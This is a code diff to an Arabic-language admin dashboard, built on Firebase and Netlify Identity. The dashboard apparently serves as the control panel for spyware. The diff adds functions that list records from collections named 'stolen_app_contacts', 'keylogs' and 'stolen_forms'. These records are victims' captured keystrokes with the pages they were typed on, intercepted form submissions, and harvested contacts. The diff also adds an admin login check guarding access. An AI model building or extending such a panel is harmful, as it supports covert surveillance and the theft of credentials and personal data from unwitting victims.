@@ -10,7 +10,8 @@
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
-
+<!-- Netlify Identity Widget -->
+<script type="text/javascript" src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script>
     <style>
         * {
             margin: 0;
@@ -346,20 +347,67 @@
         // ========== دوال تحميل البيانات ==========
         async function loadAllData() {
             try {
+                // التحقق من المصادقة أولاً
+        const isAuthenticated = await authenticateAdmin();
+        if (!isAuthenticated) return;
+                
                 await Promise.all([
-                    loadContacts(),
-                    loadFiles(), 
-                    loadAccounts(),
-                    loadSessions()
-                ]);
-                updateStats();
-                updateTime();
-            } catch (error) {
-                console.error('Error loading data:', error);
-                showError('فشل في تحميل البيانات');
-            }
-        }
+            loadContacts(),
+            loadFiles(), 
+            loadAccounts(),
+            loadKeylogs(),
+            loadFormData(),
+            loadAppContacts()
+        ]);
+        updateStats();
+        updateTime();
+    } catch (error) {
+        console.error('Error loading data:', error);
+        showError('فشل في تحميل البيانات: ' + error.message);
+    }
+}
+                
 
+// ✅ إضافة دالة لجهات اتصال التطبيقات
+async function loadAppContacts() {
+    try {
+        const snapshot = await db.collection('stolen_app_contacts')
+            .orderBy('timestamp', 'desc')
+            .limit(20)
+            .get();
+
+        const appContactsList = document.getElementById('app-contacts-list');
+        if (!appContactsList) return;
+
+        appContactsList.innerHTML = '';
+
+        if (snapshot.empty) {
+            appContactsList.innerHTML = '<div class="no-data">لا توجد جهات اتصال من التطبيقات</div>';
+            return;
+        }
+        snapshot.forEach(doc => {
+            const appContact = doc.data();
+            const appContactElement = `
+                <div class="data-item">
+                    <div class="data-item-header">
+                        <div class="data-item-title">${appContact.app || 'تطبيق غير معروف'}</div>
+                        <div class="data-item-meta">جهات اتصال</div>
+                    </div>
+                    <div class="data-item-content">
+                        ${appContact.data ? JSON.stringify(appContact.data).substring(0, 100) + '...' : 'لا توجد بيانات'}
+                    </div>
+                    <div class="timestamp">
+                        ${formatTimestamp(appContact.timestamp)}
+                    </div>
+                </div>
+            `;
+            appContactsList.innerHTML += appContactElement;
+        });
+
+    } catch (error) {
+        console.error('Error loading app contacts:', error);
+    }
+}
         // تحميل جهات الاتصال
         async function loadContacts() {
             const contactsList = document.getElementById('contacts-list');
@@ -385,26 +433,27 @@
                     
                     const contactElement = `
                         <div class="data-item contact">
-                            <div class="data-item-header">
-                                <div class="data-item-title">${contact.name || 'غير معروف'}</div>
-                                <div class="data-item-meta">${formatPhone(contact.phone)}</div>
-                            </div>
-                            <div class="data-item-content">
-                                ${contact.email ? `📧 ${contact.email}<br>` : ''}
-                                ${contact.address ? `📍 ${contact.address}` : ''}
-                            </div>
-                            <div class="timestamp">
-                                ${formatTimestamp(contact.timestamp)}
-                            </div>
-                        </div>
+                    <div class="data-item-header">
+                        <div class="data-item-title">${contact.name || 'غير معروف'}</div>
+                        <div class="data-item-meta">${contact.phones?.[0] || 'لا يوجد رقم'}</div>
+                    </div>
+                    <div class="data-item-content">
+                        ${contact.emails?.length ? `📧 ${contact.emails[0]}<br>` : ''}
+                        ${contact.address ? `📍 ${contact.address}` : ''}
+                    </div>
+                    <div class="timestamp">
+                        ${formatTimestamp(contact.timestamp)}
+                    </div>
+                </div>
                     `;
                     contactsList.innerHTML += contactElement;
                 });
 
-            } catch (error) {
-                contactsList.innerHTML = '<div class="no-data">❌ خطأ في تحميل جهات الاتصال</div>';
-            }
-        }
+                } catch (error) {
+        console.error('Error loading contacts:', error);
+        contactsList.innerHTML = '<div class="no-data">❌ خطأ في تحميل جهات الاتصال</div>';
+    }
+}
 
         // تحميل الملفات
         async function loadFiles() {
@@ -621,17 +670,120 @@
         // ========== مصادقة المسؤول ==========
         async function authenticateAdmin() {
             try {
-                // كود المصادقة
-                // ... مصادقة المسؤول ...
-            } catch (error) {
-                console.error('Authentication failed:', error);
-                window.location.href = 'login.html';
-            }
+        // الانتظار حتى تهيئة Netlify Identity
+        await new Promise((resolve) => {
+            const checkReady = setInterval(() => {
+                if (window.netlifyIdentity) {
+                    clearInterval(checkReady);
+                    resolve();
+                }
+            }, 100);
+        });
+
+        const user = netlifyIdentity.currentUser();
+        
+        if (!user) {
+            showError('يجب تسجيل الدخول أولاً');
+            netlifyIdentity.open();
+            return false;
         }
+                       // التحقق من صلاحية المسؤول
+        const userDoc = await db.collection('users').doc(user.id).get();
+        
+        if (!userDoc.exists || !userDoc.data().isAdmin) {
+            showError('ليس لديك صلاحية الوصول للوحة التحكم');
+            window.location.href = 'index.html';
+            return false;
+        }
+
+        console.log('✅ تم مصادقة المسؤول بنجاح');
+        return true;
+        
+    } catch (error) {
+        console.error('Authentication failed:', error);
+        showError('فشل في المصادقة');
+        return false;
+    }
+} 
 
         // تحقق من المصادقة عند التحميل
         authenticateAdmin();
+// ✅ إضافة collections جديدة
+async function loadKeylogs() {
+    try {
+        const snapshot = await db.collection('keylogs')
+            .orderBy('timestamp', 'desc')
+            .limit(30)
+            .get();
 
+        const keylogsList = document.getElementById('keylogs-list');
+        keylogsList.innerHTML = '';
+
+        if (snapshot.empty) {
+            keylogsList.innerHTML = '<div class="no-data">لا توجد سجلات كتابة</div>';
+            return;
+        }
+        snapshot.forEach(doc => {
+            const keylog = doc.data();
+            const keylogElement = `
+                <div class="data-item">
+                    <div class="data-item-header">
+                        <div class="data-item-title">سجل كتابة</div>
+                        <div class="data-item-meta">${keylog.url || 'غير معروف'}</div>
+                    </div>
+                    <div class="data-item-content">
+                        ${keylog.keys || 'لا توجد بيانات'}
+                    </div>
+                    <div class="timestamp">
+                        ${formatTimestamp(keylog.timestamp)}
+                    </div>
+                </div>
+            `;
+            keylogsList.innerHTML += keylogElement;
+        });
+         } catch (error) {
+        console.error('Error loading keylogs:', error);
+    }
+}
+
+async function loadFormData() {
+    try {
+        const snapshot = await db.collection('stolen_forms')
+            .orderBy('timestamp', 'desc')
+            .limit(20)
+            .get();
+
+        const formsList = document.getElementById('forms-list');
+        formsList.innerHTML = '';
+
+        if (snapshot.empty) {
+            formsList.innerHTML = '<div class="no-data">لا توجد بيانات نماذج</div>';
+            return;
+                    }
+
+        snapshot.forEach(doc => {
+            const form = doc.data();
+            const formElement = `
+                <div class="data-item">
+                    <div class="data-item-header">
+                        <div class="data-item-title">نموذج من ${form.url || 'غير معروف'}</div>
+                        <div class="data-item-meta">${form.action || 'لا يوجد إجراء'}</div>
+                    </div>
+                    <div class="data-item-content">
+                        ${JSON.stringify(form.data) || 'لا توجد بيانات'}
+                    </div>
+                    <div class="timestamp">
+                        ${formatTimestamp(form.timestamp)}
+                    </div>
+                </div>
+            `;
+            formsList.innerHTML += formElement;
+        });
+
+    } catch (error) {
+        console.error('Error loading form data:', error);
+    }
+}
     </script>
 </body>
 </html>
